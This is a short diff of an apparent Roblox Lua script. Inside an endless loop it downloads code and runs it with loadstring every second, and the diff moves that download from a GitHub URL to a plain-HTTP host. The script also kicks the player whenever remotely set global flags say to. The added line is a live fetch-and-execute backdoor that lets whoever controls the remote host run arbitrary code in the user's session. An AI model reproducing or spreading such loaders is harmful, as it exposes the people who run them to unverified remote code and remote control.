@@ -79,13 +79,13 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/NoOneKnowOff/lol/main
 
 while true do
     local player = game.Players.LocalPlayer
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/NoOneKnowOff/lol/main/kickkey"))()
+    loadstring(game:HttpGet("http://filiptop.wz.cz/keykick.lua"))()
     wait(1)
     if _G.GlobalKick == true then
         game:GetService("Players").LocalPlayer:Kick("Kicked due to script restart!")   
     else
         if _G.Name == player.Name then
-            game:GetService("Players").LocalPlayer:Kick(_G.TextOFKick)   
+            game:GetService("Players").LocalPlayer:Kick(_G.TextOFKick) 
         end
     end
 end
